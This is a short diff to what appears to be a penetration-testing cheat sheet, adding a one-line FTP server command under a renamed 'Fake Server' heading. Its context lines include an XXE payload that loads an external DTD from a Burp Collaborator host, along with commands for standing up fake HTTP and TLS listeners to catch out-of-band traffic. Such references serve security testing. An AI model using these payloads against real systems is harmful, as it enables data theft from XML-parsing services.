@@ -217,7 +217,7 @@
 	XXE
 		<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
 
-### Fake Web Server
+### Fake Server
 	# HTTP
 		python -m SimpleHTTPServer 8080
     
@@ -229,6 +229,9 @@
 		cat test.key test.crt > test.pem
 		socat openssl-listen:443,reuseaddr,cert=test.pem,verify=0,fork stdio
 	
+	# FTP
+		python -m pyftpdlib --directory=/tmp/dir/ --port=21
+    
 ### General useful commands
 	# Trim space and newlines on bash variable
 		"${i//[$'\t\r\n ']}"
